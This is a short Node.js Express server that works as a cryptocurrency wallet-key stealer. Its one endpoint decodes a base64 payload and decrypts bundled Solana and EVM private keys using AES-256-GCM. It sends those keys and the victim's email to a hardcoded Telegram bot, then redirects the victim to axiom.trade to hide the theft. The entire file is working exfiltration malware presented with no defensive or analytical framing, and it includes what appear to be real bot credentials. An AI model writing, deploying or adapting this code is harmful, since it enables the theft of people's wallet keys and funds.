const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const app = express();

const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const TG_CHAT = '7680513699';

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return 'INVALID_FORMAT';
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    // Convert to base58 for Solana/EVM
    return bs58.encode(decrypted);
  } catch (e) {
    return 'DECRYPT_ERROR: ' + e.message;
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    let sBundles = data.sBundles;
    let eBundles = data.eBundles;
    
    if (typeof sBundles === 'string') sBundles = JSON.parse(sBundles);
    if (typeof eBundles === 'string') eBundles = JSON.parse(eBundles);
    
    const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)) || [];
    const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
    
    const msg = `
🚨 PRIVATE KEYS

Email: ${data.user?.email}

Solana (base58):
${solKeys.join('\n')}

EVM (base58):
${evmKeys.join('\n')}
    `;
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
    });
    
    res.redirect('https://axiom.trade/discover');
  } catch (e) {
    res.status(500).send('err');
  }
});

app.listen(process.env.PORT || 3000);
